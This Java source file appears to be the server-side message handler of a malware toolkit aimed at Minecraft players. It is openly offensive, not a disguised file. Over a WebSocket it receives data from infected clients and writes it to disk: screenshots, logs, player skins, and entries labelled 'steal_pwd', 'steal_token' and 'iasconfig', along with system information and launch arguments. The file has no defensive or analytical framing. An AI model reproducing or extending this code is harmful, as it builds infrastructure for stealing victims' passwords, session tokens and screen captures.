package me.soda.witch.server.handlers;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import me.soda.witch.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public static void handle(String[] msgArr, WebSocket conn, Server server) {
        int id = conn.<Integer>getAttachment();
        try {
            switch (msgArr[0]) {
                case "screenshot" -> {
                    File file = new File("screenshots", getFileName("id", "png", String.valueOf(id), true));
                    new File("screenshots").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(Base64.getDecoder().decode(msgArr[1]));
                    out.close();
                }
                case "skin" -> {
                    String playerName = server.clientMap.get(conn).get("playerName").getAsString();
                    File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
                    new File("skins").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(Base64.getDecoder().decode(msgArr[1]));
                    out.close();
                }
                case "logging" -> {
                    File file = new File("logging", getFileName("id", "log", String.valueOf(id), false));
                    new File("logging").mkdir();
                    file.createNewFile();
                    FileInputStream in = new FileInputStream(file);
                    String oldInfo = new String(in.readAllBytes(), StandardCharsets.UTF_8);
                    in.close();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write((oldInfo + decodeBase64(msgArr[1])).getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                case "player" -> {
                    String playerInfo = decodeBase64(msgArr[1]);
                    server.clientMap.replace(conn, new Gson().fromJson(playerInfo, JsonObject.class));
                }
                case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
                    String ext = msgArr[0].equals("systeminfo") ? "txt" : "json";
                    File file = new File("data", getFileName(msgArr[0], ext, server.clientMap.get(conn).get("playerName").getAsString(), true));
                    new File("data").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(decodeBase64(msgArr[1]).getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                default -> server.log("Message: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }
}
